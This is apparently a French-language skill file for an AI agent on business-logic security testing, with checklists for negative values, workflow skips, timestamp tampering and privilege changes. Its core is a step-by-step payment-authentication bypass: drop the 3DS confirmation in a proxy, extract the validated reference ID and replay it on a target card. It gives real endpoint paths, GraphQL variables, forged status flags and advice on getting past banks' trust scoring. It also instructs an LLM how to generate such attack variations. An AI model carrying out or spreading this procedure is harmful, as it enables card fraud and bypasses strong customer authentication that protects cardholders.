---
name: blv
description: Security testing mindset for identifying vulnerabilities - economic exploits, workflow bypasses, temporal attacks, privilege escalation. Use when analyzing APIs, payment systems, or testing security.
---

# Security Testing Mindset

Adopt an attacker's perspective to identify vulnerabilities in systems, particularly for business logic flaws and security testing.

## Core Principles

**Think like an attacker, not a developer**

Look for what is "legally permitted but unintended" - actions that the system allows but shouldn't.

## Testing Checklist

### [ÉCONOMIQUE]
- Valeurs négatives (-1, -999999)
- Valeurs extrêmes (0, MAX_INT, 0.001)
- Multiplication abusive (codes promo stackables?)
- Double-spend (2 requêtes simultanées)

### [WORKFLOW]
- Skip étapes (aller direct étape 3)
- Ordre inversé (3→1→2)
- Replay étapes (refaire étape validée)
- États incohérents (payer puis annuler)

### [TEMPORAL]
- Timestamp passé (bypass cooldown)
- Timestamp futur (trigger expiration)
- Race conditions (timing critique)

### [PRIVILÈGES]
- Changer role via paramètre
- Accéder ressource d'autrui (IDOR)
- Combiner features de différents rôles

## Critical Questions

1. Peut-on bypasser des étapes ?
2. Que se passe-t-il avec des valeurs négatives/extrêmes ?
3. Peut-on combiner plusieurs features pour un résultat imprévu ?
4. Les conditions de course sont-elles possibles ?
5. Y a-t-il des limites côté client uniquement ?

## Attack Vectors to Explore

- Identifier tous les flux monétaires/points de valeur
- Manipulation de prix/quantités
- Contournement de restrictions temporelles
- Abus de codes promo/réductions
- Élévation de privilèges par workflow
- Double dépense/utilisation

---

## Universal BLV Patterns (Learned from Real-World Testing)

**Ces patterns sont réutilisables sur n'importe quelle cible.**

### Authentication & Authorization

**Reference ID Weak Binding**
- Pattern: Reference IDs (transaction ID, session ID, validation ID) souvent pas bindés strictement à l'entité associée
- Symptôme: Un rId validé pour entité A accepté pour entité B
- Test: Capturer rId légitime → Replay sur autre entité (autre carte, autre user, autre transaction)
- Catégories: [WORKFLOW] + [TEMPORAL]
- Exemple réel: 3DS reference ID réutilisable cross-card

**3DS Reference ID Bypass (Race Condition + Weak Binding)**
- Pattern: rId 3DS validé mais non-consommé réutilisable sur autres cartes
- Exploitation:
  1. Setup carte sacrificielle (ex: HyperX, Helios)
  2. Process 3DS normal → validation CRESS
  3. **DROP** requête confirmation (proxy intercept)
  4. Extract `tenantThreedsReferenceId` validé
  5. Utilise rId sur carte target → bypass 3DS complet
- Variables critiques:
  * `rId` / `tenantThreedsReferenceId` (URL + body)
  * `status=SUCCESS` (fourni client)
  * `is3DS2=true` (flag validation)
- Tests additionnels:
  * rId mismatch URL vs body → quelle validation prime?
  * status=FAILED + rId valid → passe quand même?
  * errorCode=999 + status=SUCCESS → contradiction exploitable?
- Impact: Bypass PSD2 authentification forte
- Catégories: [TEMPORAL] + [WORKFLOW] + [PRIVILÈGES]

**Token Replay Cross-Operation**
- Pattern: Tokens générés pour opération A réutilisables pour opération B sans validation
- Symptôme: Token d'ajout carte valide pour lecture profil, paiement, etc
- Test: Capturer token opération légit → Tester sur opérations différentes
- Catégories: [WORKFLOW]

### Workflow & State Management

**Race Condition on Validation**
- Pattern: Validation asynchrone exploitable par timing (drop + replay)
- Symptôme: Intercepter validation avant qu'elle arrive au serveur → Extraire preuve valide → Utiliser ailleurs
- Technique extraction:
  1. Proxy intercept (Burp/mitmproxy)
  2. Process validation légitime (3DS, SMS, email)
  3. **DROP** requête confirmation AVANT serveur
  4. Extract validation proof (rId, token, code)
  5. Proof reste status "valid + unused"
  6. Replay sur target différente
- Test: Proxy intercept → Drop request → Extract validation token/ID → Replay
- Indicateurs vulnérabilité:
  * Validation IDs génériques (pas bindés entité)
  * Pas de one-time-use enforcement
  * Validation côté client trust
- Catégories: [TEMPORAL] + [WORKFLOW]

**Workflow Step Skip**
- Pattern: Endpoints accessibles sans compléter étapes précédentes
- Symptôme: Aller direct à étape 3 sans passer par 1→2
- Test: Identifier endpoints workflow → Tester accès direct sans prérequis
- Catégories: [WORKFLOW]

### Economic Logic

**Negative Values Bypass**
- Pattern: Validation montant négative côté client uniquement
- Symptôme: Montant négatif accepté = remboursement au lieu de paiement
- Test: amount: -1, quantity: -1, price: -99.99
- Catégories: [ÉCONOMIQUE]

**Zero Amount Bypass**
- Pattern: Montant 0 skip validation paiement
- Symptôme: Transaction gratuite, bypass vérification carte
- Test: amount: 0, total: 0.00
- Catégories: [ÉCONOMIQUE]

### Temporal Attacks

**Expiration Not Enforced**
- Pattern: Tokens/IDs/codes expirés toujours acceptés
- Symptôme: Validation temporelle côté client uniquement
- Test: Capturer token → Attendre expiration théorique → Tester utilisation
- Catégories: [TEMPORAL]

**Timestamp Manipulation**
- Pattern: Timestamp fourni par client sans validation serveur
- Symptôme: Timestamp passé/futur accepté → Bypass cooldown, trigger events
- Test: created_at: timestamp passé, expires_at: timestamp futur lointain
- Catégories: [TEMPORAL]

### Client-Side Validation Trust

**Status Flags Client-Controlled**
- Pattern: Backend confie flags validation fournis par client
- Symptôme: status=SUCCESS, errorCode=0, isValid=true acceptés sans vérification serveur
- Exploitation:
  1. Identifier flags critiques (status, error, validation, completion)
  2. Forcer flags positifs indépendamment validation réelle
  3. Backend trust client state sans vérifier
- Tests systématiques:
  * status: "SUCCESS" avec process failed
  * errorCode: 0 avec erreur réelle
  * isCompleted: true sans complétion
  * isValidated: true sans validation
- Indicateurs vulnérabilité:
  * Flags booléens/string fournis requête
  * Pas vérification serveur-side correspondante
  * Response différente selon flag client
- Catégories: [WORKFLOW] + [PRIVILÈGES]

**Parameter Mismatch Exploitation**
- Pattern: Multiple locations pour même variable (URL, body, headers, GraphQL)
- Symptôme: Backend utilise une source sans valider cohérence
- Exploitation:
  1. Identifier variable dans multiple locations
  2. Fournir valeurs conflictuelles
  3. Observer quelle source prime
- Tests:
  * URL param vs POST body
  * GraphQL variables vs query string
  * Header vs body
- Exemple:
  ```
  ?rId=STOLEN (URL)
  Body: tenantThreedsReferenceId=LEGIT
  → Backend prend URL et ignore body validation
  ```
- Catégories: [WORKFLOW]

**SCA/MFA Claims Bypass**
- Pattern: Flags SCA/MFA completion trustés sans vérification
- Symptôme: scaCompleted=true, mfaValidated=true acceptés sans vraie auth
- Tests:
  * scaCompleted: true sans SCA réelle
  * strongCustomerAuthenticationCompleted: true
  * twoFactorCompleted: true sans 2FA
  * biometricValidated: true sans biométrique
- Impact: Bypass authentification forte (DSP2, PSD2)
- Catégories: [WORKFLOW] + [PRIVILÈGES]

---

## Real-World Exploitation Examples

**Exemples concrets d'exploitation avec détails techniques complets.**

### Case Study: 3DS Bypass Multi-Endpoints (Payment Platform)

**Context:** Système 3DS avec référence IDs faibles + race condition exploitable

**Workflow Normal:**
```
1. ThreeDsLookUpMutation → déclenche 3DS
2. GetThreeDsJwtQuery → récupère JWT/rId
3. CRESS Challenge → validation 3DS2 (SMS/biométrique)
4. processThreedsConfirmation → confirmation serveur
   ↓ génère tenantThreedsReferenceId validé
5. addCard / ResolveThreeDsContingency → utilise rId
6. approveMemberPayment → finalisation transaction
```

**Exploitation Technique:**

**Phase 1: Acquisition rId valide (carte sacrificielle)**
```
1. Utiliser service tiers avec 3DS minimal (HyperX, Helios)
2. Process 3DS normal jusqu'à validation CRESS
3. Intercept Burp sur requête confirmation:
   POST /checkoutweb/processThreedsConfirmation
   Body: tenantThreedsReferenceId=22445597935391740&status=SUCCESS
4. **DROP** avant serveur (Burp: Action → Drop)
5. Extract rId du body → status "validé non-consommé"
```

**Phase 2: Réutilisation cross-context**

**Endpoints Exploitables Identifiés:**

```
A. Wallet - Add Card Sans 3DS
   POST /myaccount/money/api/cards/confirmation/3ds/update
   Params: ?id=CC-TARGET&cId=XXX&rId=STOLEN&is3DS2=true
   Body: tenantThreedsReferenceId=STOLEN&status=SUCCESS
   → confirmationStatus: "SUCCESS"

B. Payment - Transaction Bypass
   POST /graphql/ (ResolveThreeDsContingency)
   Variables: {
     "token": "CHECKOUT_TOKEN",
     "referenceId": "STOLEN",
     "creditCardId": "CC-TARGET",
     "status": "SUCCESS"
   }
   → state: "PAYABLE", is3DSecureRequired: false

C. Auth - 3DS Authentication
   POST /graphql/ (ThreeDsAuthenticateMutation)
   Variables: {
     "threeDSReferenceId": "STOLEN",
     "creditCardId": "CC-TARGET"
   }
   → threeDSStatus: "SUCCESS", liabilityShift: true

D. Funding Update
   POST /graphql/ (threeDSConfirmationWithUpdateFundingOption)
   → state: "PAYABLE"
```

**Variables Critiques Multi-Contexte:**

```json
{
  "referenceId": "22445597935391740",      // Clé exploitation
  "tenantThreedsReferenceId": "...",       // Même valeur
  "authId": "22445597936791129",           // Lié à rId
  "status": "SUCCESS",                     // Fourni client ⚠
  "errorCode": "0",                        // Fourni client ⚠
  "is3DS2": true,                          // Flag non vérifié ⚠
  "scaCompleted": false,                   // SCA bypass potentiel ⚠
  "strongCustomerAuthenticationCompleted": false
}
```

**Tests Avancés À Exécuter:**

1. **Validation Conflict**
   ```
   URL: ?rId=AAA
   Body: tenantThreedsReferenceId=BBB
   → Quelle validation prime? URL > Body > Neither?
   ```

2. **Status Contradiction**
   ```
   referenceId: VALID_STOLEN
   status: "FAILED"
   errorCode: "999"
   → Backend trust client status ou vérifie rId autonome?
   ```

3. **Version Mismatch**
   ```
   is3DS2: false
   referenceId: RID_3DS2_VALIDE
   → Bypass version check?
   ```

4. **SCA Claims**
   ```
   scaCompleted: true (mensonge)
   strongCustomerAuthenticationCompleted: true
   referenceId: EMPTY ou INVALID
   → Trust SCA flag sans vérification?
   ```

5. **Transaction ID Manipulation**
   ```json
   {
     "threedsServerTransactionId": "AAA",
     "TransactionId": "BBB",
     "acsTransactionId": "CCC",
     "dsTransactionId": "DDD"
   }
   → Tous identiques vs tous différents → impact validation?
   ```

**Impact Réel:**
- ✓ Bypass 3DS technique confirmé
- ✓ État PAYABLE obtenu (11 endpoints)
- ✓ is3DSecureRequired: false
- ✗ Authorization decline par trust scoring final (DSP2 banque)

**Trust Scoring Observations:**
```
Bypass trust final si:
- Compte ancien + device fingerprint propre + IP reputation
- OU nouveau compte + 1-2 transactions légitimes + setup clean
- Trust = comportemental, pas technique
```

**Pattern Universel Extrait:**
```
1. Identifier workflow multi-étapes avec validation
2. Chercher IDs abstrait (rId, sessionId, validationToken)
3. Tester race condition (drop + extract)
4. Map tous endpoints utilisant même ID
5. Test cross-context reuse (wallet, payment, auth)
6. Variables client-side → manipuler tous flags
```

**Indicateurs Système Vulnérable:**
- Validation IDs génériques (pas bindés strict entité)
- Multiple endpoints acceptent même rId
- Status/flags fournis client sans vérification serveur
- Pas one-time-use enforcement
- Workflow async permettant interception

**LLM Generation Validation:**
Si LLM génère variations test, vérifier:
1. Focus sur variables client-side (status, flags, errorCode)
2. Test mismatch URL vs body vs GraphQL variables
3. Contradiction intentionnelle (status fail + rId valid)
4. Cross-endpoint reuse (11 endpoints identifiés ici)
5. Transaction IDs consistency tests

---

## Defensive Patterns (What Usually FAILS)

**Ces techniques sont généralement bloquées par défenses modernes.**

### Injection Classiques
- SQL Injection → WAF bloque patterns classiques
- XSS → CSP + validation input stricte
- Command Injection → Sandbox + validation

**Leçon:** Focus BLV logique métier, pas injections traditionnelles

### Brute Force
- Rate limiting strict sur auth endpoints
- CAPTCHA après N tentatives
- Account lockout

**Leçon:** Chercher bypass logique, pas brute force

---

## Meta-Learning Process

**Comment ce skill évolue:**

1. **Pattern universel découvert** → Ajouté dans "Universal BLV Patterns"
   - Exemple: "Reference ID weak binding" confirmé sur PayPal → Ajouté ici
   - Réutilisable sur n'importe quelle cible avec des rIds

2. **Pattern universel échoue systématiquement** → Ajouté dans "Defensive Patterns"
   - Exemple: SQL injection bloqué partout → Note dans "What Usually FAILS"

3. **PAS stocké ici:**
   - Résultats spécifiques à une cible (PayPal, Stripe, etc) → context.yaml
   - Req-id, timestamps, endpoints précis → events.jsonl
   - Hypothèses spécifiques cible → context.yaml active_hypothesis

**Ce skill = Bibliothèque de patterns BLV universels réutilisables**

---

## LLM Output Validation Guide

**Comment utiliser ce skill pour valider générations LLM.**

### Validation Checklist

**Si LLM génère variations de requêtes:**

1. **Pattern Match** (obligatoire)
   - ✓ Variation correspond à pattern documenté ici?
   - ✓ Combine catégories pertinentes ([WORKFLOW] + [TEMPORAL])?
   - ✗ Invente pattern jamais observé?

2. **Variable Focus** (prioritaire)
   ```
   ✓ Focus sur client-side variables (status, flags, errorCode)
   ✓ Tests mismatch (URL vs body vs GraphQL)
   ✓ Contradictions intentionnelles
   ✗ Modifications random sans hypothèse
   ✗ Focus sur tokens/signatures cryptographiques
   ```

3. **Endpoint Coverage** (si multi-endpoints)
   ```
   ✓ Test cross-endpoint reuse
   ✓ Identifie endpoints partageant variables
   ✗ Focus un seul endpoint si pattern multi confirmé
   ```

4. **Realistic Exploitation** (critique)
   ```
   ✓ Steps exploitables avec proxy (Burp)
   ✓ Race conditions timing réaliste
   ✓ Variables extractables de responses
   ✗ Nécessite accès serveur
   ✗ Crypto breaking (AES, RSA, JWT signature)
   ✗ Nécessite vulns système (RCE, SQLi pour extraire data)
   ```

5. **Hypothesis Clarity** (obligatoire)
   ```
   Chaque test doit avoir:
   - Hypothesis: "Si X alors Y"
   - Expected: Response attendu si vuln
   - Validation: Comment confirmer
   
   Exemple:
   H: "Backend trust status client sans vérifier rId"
   E: status=FAILED + rId=VALID → SUCCESS response
   V: Compare response status=SUCCESS vs status=FAILED même rId
   ```

### Red Flags LLM Output

**Rejeter immédiatement si:**

- Suggests brute force / fuzzing aveugle
- Crypto attacks (breaking JWT, AES, RSA)
- Injection classiques (SQLi, XSS, command injection)
- Nécessite 0-day système (kernel exploit, RCE)
- "Try random values and see what happens"
- Pas d'hypothèse testable claire

### Quality Indicators

**LLM output haute qualité:**

1. References pattern documenté ici
2. Hypothesis basée sur observations
3. Test concret avec proxy steps
4. Variables client-side ciblées
5. Validation binaire (work / not work)

**Exemple GOOD:**
```
Pattern: Client-Side Validation Trust
Test: status=FAILED + referenceId=VALID_STOLEN
Hypothesis: Backend ignore status si rId valid
Expected: state="PAYABLE" despite status=FAILED
Validation: Compare responses status=SUCCESS vs FAILED
```

**Exemple BAD:**
```
Try different JWT algorithms
Brute force the referenceId format
Inject SQL in the status field
Use timing attack to extract rId
```

### Iterative Refinement

**Process validation LLM:**

1. LLM génère 10 tests
2. Filter via checklist → garde 3-5
3. Exécute tests retenus
4. Résultats → update skill si pattern confirmé
5. Résultats → marque defensive si bloqué systématique

**Metrics success:**
- True Positive Rate: tests LLM → vulns confirmées
- False Positive Rate: tests LLM → non exploitable
- Coverage: % patterns skill utilisés par LLM
- Novelty: LLM trouve variations non documentées

**Targets:**
- TPR >40% = LLM génère tests pertinents
- FPR <30% = LLM pas trop bruit
- Coverage >60% = LLM utilise bien skill
- Novelty >10% = LLM trouve new variations


